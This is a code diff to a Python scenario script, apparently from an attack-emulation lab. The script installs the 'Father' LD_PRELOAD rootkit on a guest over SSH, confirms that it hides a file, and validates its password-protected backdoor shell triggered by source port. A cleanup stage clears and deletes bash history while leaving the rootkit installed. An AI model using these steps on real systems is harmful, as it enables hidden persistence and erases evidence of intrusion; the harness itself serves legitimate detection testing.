@@ -10,8 +10,8 @@ import yaml
 
 from orchestrator.core import console
 from orchestrator.core.provenance import file_sha256
-from orchestrator.core.ssh_client import SSHClient, TerminalCommandResult
-from scenarios.command_log import append_record, log_command, utc_now
+from orchestrator.core.ssh_client import SSHClient
+from scenarios.command_log import record_operation, run_logged_command
 
 SCENARIO_ID = "userland_father_ldpreload"
 CLEANUP_SCENARIO_ID = "userland_father_ldpreload_cleanup"
@@ -66,9 +66,9 @@ COMMAND_GROUPS = (
 )
 
 CLEANUP_COMMANDS = (
-    f'rm -f -- {UPLOAD_PATH} && rm -rf -- "$source"',
-    f'test ! -e {UPLOAD_PATH} && test ! -e "$source" '
-    f"&& test -e {PRELOAD_CONFIG} && test -e {INSTALLED_LIBRARY}",
+    f"rm -f -- {UPLOAD_PATH}",
+    'rm -rf -- "$source"',
+    f'test ! -e {UPLOAD_PATH} && test ! -e "$source" && test -e {PRELOAD_CONFIG} && test -e {INSTALLED_LIBRARY}',
     "history -c",
     'rm -f -- "${HISTFILE:-$HOME/.bash_history}"',
     "unset HISTFILE",
@@ -81,7 +81,6 @@ def run_father(
     transcript_path: Path,
     *,
     command_log_path: Path,
-    run_id: str,
     scenario_id: str,
 ) -> dict:
     """Run Father visibly in Bash, then validate its native accept-hook shell."""
@@ -91,59 +90,27 @@ def run_father(
     cleanup = scenario_id == CLEANUP_SCENARIO_ID
     transcript_path.touch()
     console.scope("HOST", "stage Father source")
-    source = _verify_source(command_log_path, run_id, scenario_id)
-    _upload_archive(ssh, command_log_path, run_id, scenario_id)
+    source = _verify_source(command_log_path)
+    _upload_archive(ssh, command_log_path)
 
     terminal = ssh.open_terminal()
-    results: list[TerminalCommandResult] = []
-    command_index = 0
-    identity: str | None = None
-
-    def run_command(command: str) -> None:
-        nonlocal command_index
-        command_index += 1
-        started_at = utc_now()
-        try:
-            result = terminal.run(command, timeout=180)
-        except Exception as exc:
-            log_command(
-                command_log_path,
-                run_id,
-                scenario_id,
-                command_index,
-                command,
-                started_at,
-                status="failure",
-                error=str(exc),
-            )
-            raise
-        results.append(result)
-        status = "success" if result.exit_code == 0 else "failure"
-        log_command(
-            command_log_path,
-            run_id,
-            scenario_id,
-            command_index,
-            command,
-            started_at,
-            status=status,
-            result=result,
-        )
-        if result.exit_code != 0:
-            raise RuntimeError(f"Father command exited {result.exit_code}: {command}")
+    listings: list[str] = []
+    cleanup_facts = {}
 
     try:
         with terminal:
             for label, commands in COMMAND_GROUPS:
                 console.scope("GUEST", label)
                 for command in commands:
-                    run_command(command)
+                    result = run_logged_command(
+                        terminal,
+                        command_log_path,
+                        command,
+                        timeout=180,
+                    )
+                    if command == LIST_HIDDEN_DIR:
+                        listings.append(result.combined_output)
 
-            listings = [
-                result.combined_output
-                for result in results
-                if result.command == LIST_HIDDEN_DIR
-            ]
             if (
                 len(listings) != 2
                 or HIDDEN_FILE_NAME not in listings[0]
@@ -151,55 +118,49 @@ def run_father(
             ):
                 raise RuntimeError("Father did not hide the controlled file as expected")
 
+            console.scope("HOST", "validate Father backdoor")
+            identity = _validate_backdoor(
+                ssh,
+                command_log_path=command_log_path,
+            )
+
             if cleanup:
-                console.scope("HOST", "validate Father backdoor")
-                identity = _validate_backdoor(
-                    ssh,
-                    command_log_path=command_log_path,
-                    run_id=run_id,
-                    scenario_id=scenario_id,
-                )
                 console.scope("GUEST", "cleanup treatment")
                 for command in CLEANUP_COMMANDS:
-                    run_command(command)
+                    run_logged_command(
+                        terminal,
+                        command_log_path,
+                        command,
+                        timeout=180,
+                    )
+                cleanup_facts = {
+                    "cleanup": {
+                        "archive_absent": True,
+                        "source_tree_absent": True,
+                        "home_bash_history_absent": True,
+                        "preload_config_present": True,
+                        "installed_library_present": True,
+                    }
+                }
     finally:
         transcript_path.write_text(terminal.transcript, encoding="utf-8")
-
-    if identity is None:
-        console.scope("HOST", "validate Father backdoor")
-        identity = _validate_backdoor(
-            ssh,
-            command_log_path=command_log_path,
-            run_id=run_id,
-            scenario_id=scenario_id,
-        )
 
     facts = {
         "source": source,
         "installed_library_path": INSTALLED_LIBRARY,
         "preload_config_path": PRELOAD_CONFIG,
         "hidden_file_path": f"{REMOTE_ROOT}/probe/{HIDDEN_FILE_NAME}",
-        "file_hiding_passed": True,
-        "father_backdoor_passed": True,
+        "file_hiding_validated": True,
         "backdoor_identity": identity,
         "trigger_source_port": SOURCE_PORT,
         "listener_service": "sshd",
         "listener_port": ssh.port,
     }
-    if cleanup:
-        facts["cleanup"] = {
-            "performed": True,
-            "archive_removed": True,
-            "source_tree_removed": True,
-            "history_file_removed": True,
-            "preload_config_preserved": True,
-            "installed_library_preserved": True,
-        }
+    facts.update(cleanup_facts)
     return facts
 
 
-def _verify_source(command_log_path: Path, run_id: str, scenario_id: str) -> dict:
-    started_at = utc_now()
+def _verify_source(command_log_path: Path) -> dict:
     try:
         lock = yaml.safe_load(LOCK.read_text(encoding="utf-8"))
         archive_hash = file_sha256(ARCHIVE)
@@ -210,19 +171,7 @@ def _verify_source(command_log_path: Path, run_id: str, scenario_id: str) -> dic
                 f"expected {expected_hash}, got {archive_hash}"
             )
     except Exception as exc:
-        append_record(
-            command_log_path,
-            {
-                "run_id": run_id,
-                "scenario_id": scenario_id,
-                "step_id": "verify_father_source",
-                "type": "host_verification",
-                "status": "failure",
-                "started_at": started_at,
-                "ended_at": utc_now(),
-                "error": str(exc),
-            },
-        )
+        record_operation(command_log_path, "verify_source", error=str(exc))
         raise
 
     source = {
@@ -230,19 +179,7 @@ def _verify_source(command_log_path: Path, run_id: str, scenario_id: str) -> dic
         "commit": lock["upstream"]["pinned_commit"],
         "archive_sha256": archive_hash,
     }
-    append_record(
-        command_log_path,
-        {
-            "run_id": run_id,
-            "scenario_id": scenario_id,
-            "step_id": "verify_father_source",
-            "type": "host_verification",
-            "status": "success",
-            "source": source,
-            "started_at": started_at,
-            "ended_at": utc_now(),
-        },
-    )
+    record_operation(command_log_path, "verify_source")
     console.ok(f"Father source verified: {archive_hash}")
     return source
 
@@ -250,57 +187,22 @@ def _verify_source(command_log_path: Path, run_id: str, scenario_id: str) -> dic
 def _upload_archive(
     ssh: SSHClient,
     command_log_path: Path,
-    run_id: str,
-    scenario_id: str,
 ) -> None:
-    started_at = utc_now()
     console.step(f"Uploading {ARCHIVE.name} to {UPLOAD_PATH}...")
     try:
         ssh.put(ARCHIVE, UPLOAD_PATH)
     except Exception as exc:
-        append_record(
-            command_log_path,
-            {
-                "run_id": run_id,
-                "scenario_id": scenario_id,
-                "step_id": "upload_father_source",
-                "type": "upload",
-                "source": str(ARCHIVE),
-                "destination": UPLOAD_PATH,
-                "status": "failure",
-                "started_at": started_at,
-                "ended_at": utc_now(),
-                "error": str(exc),
-            },
-        )
+        record_operation(command_log_path, "upload_archive", error=str(exc))
         raise
-    append_record(
-        command_log_path,
-        {
-            "run_id": run_id,
-            "scenario_id": scenario_id,
-            "step_id": "upload_father_source",
-            "type": "upload",
-            "source": str(ARCHIVE),
-            "destination": UPLOAD_PATH,
-            "status": "success",
-            "started_at": started_at,
-            "ended_at": utc_now(),
-        },
-    )
+    record_operation(command_log_path, "upload_archive")
 
 
 def _validate_backdoor(
     ssh: SSHClient,
     *,
     command_log_path: Path,
-    run_id: str,
-    scenario_id: str,
 ) -> str:
-    started_at = utc_now()
     response = bytearray()
-    authentication_prompt_observed = False
-    shell_marker_observed = False
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     deadline = time.monotonic() + 12
@@ -321,7 +223,6 @@ def _validate_backdoor(
             response.extend(chunk)
         if AUTHENTICATION_PROMPT not in response:
             raise RuntimeError("Father authentication prompt was not received")
-        authentication_prompt_observed = True
 
         client.sendall(SHELL_PASSWORD)
         authentication_response_offset = len(response)
@@ -336,7 +237,6 @@ def _validate_backdoor(
             response.extend(chunk)
         if SHELL_MARKER not in response[authentication_response_offset:]:
             raise RuntimeError("Father shell marker was not received")
-        shell_marker_observed = True
 
         client.sendall(b"id\n")
         identity_response_offset = len(response)
@@ -366,48 +266,12 @@ def _validate_backdoor(
         if identity is None:
             raise RuntimeError("Father shell identity could not be parsed")
     except (OSError, RuntimeError) as exc:
-        record = {
-            "run_id": run_id,
-            "scenario_id": scenario_id,
-            "step_id": "validate_father_backdoor",
-            "type": "host_socket",
-            "command": "id",
-            "trigger_source_port": SOURCE_PORT,
-            "destination_host": ssh.host,
-            "destination_port": ssh.port,
-            "authentication_prompt_observed": authentication_prompt_observed,
-            "shell_marker_observed": shell_marker_observed,
-            "status": "failure",
-            "started_at": started_at,
-            "ended_at": utc_now(),
-            "error": str(exc),
-        }
-        if response:
-            record["response_tail"] = response.decode(errors="replace")[-1200:]
-        append_record(command_log_path, record)
+        record_operation(command_log_path, "validate_backdoor", error=str(exc))
         raise RuntimeError(f"Father backdoor validation failed: {exc}") from exc
     finally:
         client.close()
 
-    append_record(
-        command_log_path,
-        {
-            "run_id": run_id,
-            "scenario_id": scenario_id,
-            "step_id": "validate_father_backdoor",
-            "type": "host_socket",
-            "command": "id",
-            "trigger_source_port": SOURCE_PORT,
-            "destination_host": ssh.host,
-            "destination_port": ssh.port,
-            "authentication_prompt_observed": authentication_prompt_observed,
-            "shell_marker_observed": shell_marker_observed,
-            "identity": identity,
-            "status": "success",
-            "started_at": started_at,
-            "ended_at": utc_now(),
-        },
-    )
+    record_operation(command_log_path, "validate_backdoor")
     console.ok(f'Father shell opened: "{SHELL_MARKER.decode()}"')
     console.ok(f"Father shell identity: {identity}")
     return identity
